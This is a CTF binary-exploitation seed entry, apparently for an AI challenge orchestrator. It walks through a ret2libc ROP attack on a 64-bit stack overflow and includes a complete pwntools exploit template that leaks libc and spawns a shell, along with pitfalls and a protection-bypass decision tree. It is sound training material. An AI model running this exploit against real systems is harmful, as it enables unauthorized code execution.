# [Seed] CTF Pwn — x64 Stack Overflow + ROP Chain Calling system

## Scene Classification
CTF / Binary Exploitation

## Overview of Goals
A 64-bit ELF has an `read()` out-of-bounds stack buffer write. The machine has NX (non-executable stack) but no PIE, and no stack canary. Use a ROP gadget to call libc's `system("/bin/sh")` to get a shell.

## Complete Execution Chain

1. Basic reconnaissance
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Use IDA / Ghidra to look at main → found `read(0, buf, 0x100)` but `buf` only has 0x40 bytes
3. Calculate overflow offset
   ```bash
   pwndbg> cyclic 200
   # Input into the target program, check RSP after a crash
   pwndbg> cyclic -l 0x6161616c
   # Offset = 72
   ```
4. Since there is no PIE, both PLT and GOT are at fixed addresses
5. First Phase (no libc information): Leaking `puts@GOT` content counts as the libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # Return to main for reuse
   ```
6. Receive the output of puts and identify the libc version (use libc-database to query)
7. Phase Two: Construct system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get shell → cat flag

## Pitfall Record

| Problem | Cause | Solution | Time Consumed |
|------|------|---------|------|
| Program crashes after ROP calls system, no shell | Stack not aligned to 16 bytes (Ubuntu 18.04+ strict about movaps) | Add a ret gadget before system for padding | 30min |
| Works locally, but not remotely | libc version mismatch | Leak a function address using puts → Check exact version on libc-database | 40min |
| pwntools recv stuck | Program output used setbuf(NULL) but remote stderr buffer not closed | Use sendlineafter / recvuntil for precise synchronization | 15min |
| A dozen remote connections cause SIGPIPE | The second stage payload is still using the IO object from the previous round | After using `process` / `remote`, the IO must reuse the same connection; if the main process dies, it’s over | 20min |
| ROPgadget outputs too much | Tool lists all gadgets by default | `ROPgadget --binary vuln --only "pop\|ret"` filtering | 5min |

## Toolchain Discovery

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`)
- **pwndbg** is 10 times stronger than the built-in GDB (with cyclic / vmmap / heap commands)
- **ROPgadget** vs **ropper**: ropper has a more user-friendly output and supports searching for syscall chains
- **libc-database** matches the exact libc version through one leaked libc function address
- **one_gadget** Find a libc gadget that can directly execve("/bin/sh"), which is shorter than manual ROP

## Key Code/Commands

Complete exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # 用于栈对齐

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Suggestions for Improvement of This Package

- `competition-reverse-pwn` of CTF-Sandbox-Orchestrator should add `pwn-rop-cheatsheet.md` and turn this process into a template
- bootstrap manifest add pwntools / pwndbg / one_gadget

## Reusable patterns/script snippets

**ROP using decision trees**:

```text
checksec → Check Protection
├── No NX → shellcode is executed directly (old method)
├── NX + no PIE → classic ret2libc
├── NX + PIE + no Canary → first leak PIE base address → ret2libc
├── Has Canary → First figure out a way to leak the Canary (format string / off-by-one)
└── Full RELRO + Canary + PIE → Difficult, common methods: fork without ASLR / __libc_start_main / SROP
```

**libc leak → use standard two-stage payload**:

```text
Stage 1: leak puts@GOT → calculate libc base → return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution Actions
- [ ] CTF orchestrator add pwn quick reference page
- [ ] Add pwntools / pwndbg / one_gadget to bootstrap-manifest
- [ ] reverse-engineering/tools-dynamic.md cite this case

## Environmental Information
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, the latest pwndbg, ROPgadget 7.x
- libc version: glibc 2.31 / 2.35 (common in CTF)
- Target Architecture: x86_64

## Desensitization Requirements
This entry is seed data, written based on publicly available CTF technical patterns, and does not involve any real challenges or closed-source systems.